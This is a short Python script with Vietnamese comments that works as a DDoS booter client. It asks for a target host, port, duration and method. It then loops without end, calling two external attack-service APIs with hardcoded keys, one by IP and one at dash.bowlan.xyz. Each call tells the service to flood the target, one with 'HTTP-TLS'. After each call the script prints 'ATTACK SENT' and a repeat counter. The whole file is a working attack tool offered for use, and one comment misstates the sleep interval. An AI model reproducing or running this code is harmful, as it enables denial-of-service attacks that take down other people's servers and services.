import requests
import colorama
import datetime
import pytz
import time
import subprocess

# Khởi tạo colorama để sử dụng các ký hiệu màu sắc trên terminal
colorama.init()

host_text = "Nhập " + colorama.Fore.YELLOW + "H" + colorama.Fore.RED + "o" + colorama.Fore.GREEN + "s" + colorama.Fore.CYAN + "t" + colorama.Style.RESET_ALL + ": "
port_text = "Nhập " + colorama.Fore.BLUE + "P" + colorama.Fore.MAGENTA + "o" + colorama.Fore.RED + "r" + colorama.Fore.YELLOW + "t" + colorama.Style.RESET_ALL + ": "
time_text = "Nhập " + colorama.Fore.YELLOW + "T" + colorama.Fore.GREEN + "i" + colorama.Fore.CYAN + "m" + colorama.Fore.BLUE + "e" + colorama.Style.RESET_ALL + ": "
method_text = "Nhập " + colorama.Fore.MAGENTA + "M" + colorama.Fore.RED + "e" + colorama.Fore.YELLOW + "t" + colorama.Fore.BLUE + "h" + colorama.Style.RESET_ALL + "od : "

host = input(host_text)
port = input(port_text)
time = input(time_text)
method = input(method_text)

count = 0

while True:
    count += 1  # Tăng giá trị của biến đếm sau mỗi vòng lặp 
    run = requests.get(f'http://103.28.35.33/api.php?key=apilon&host={host}&port={port}&time={time}&method={method}')
    run = requests.get(f'https://dash.bowlan.xyz/api/api.php?key=bsyclJb518u9hyi&host={host}&port={port}&time={time}&method=HTTP-TLS')
    
    # Lấy múi giờ hiện tại
    tz = pytz.timezone('Asia/Ho_Chi_Minh')

    # Lấy thời gian hiện tại theo múi giờ Việt Nam
    current_time = datetime.datetime.now(tz)

    # Định dạng ngày giờ thành chuỗi
    formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")

    # Tạo chuỗi attack_text với định dạng ngày giờ và số lần vòng
    attack_text = (
        colorama.Fore.BLUE
        + "ATTACK SENT\n"
        + colorama.Fore.GREEN
        + "TARGET="
        + colorama.Fore.GREEN
        + f"{host}\n"
        + colorama.Fore.GREEN
        + "PORT="
        + colorama.Fore.GREEN
        + f"{port}\n"
        + colorama.Fore.GREEN
        + "TIME="
        + f"{time}\n"
        + colorama.Fore.GREEN
        + "METHOD="
        + f"{method}\n"
        + "Thời Gian="
        + colorama.Fore.GREEN
        + f"{formatted_time}\n"
         + colorama.Fore.RED
        + "SỐ LẦN ATTACK LẠI="
        + colorama.Fore.RED
        + f"{count}"
        + colorama.Style.RESET_ALL
    )

    print(attack_text)

    # Thời gian chờ giữa các lần attack (ở đây là 1.200 giây = 20 phút)
    subprocess.run(["sleep", "120"])

colorama.deinit()

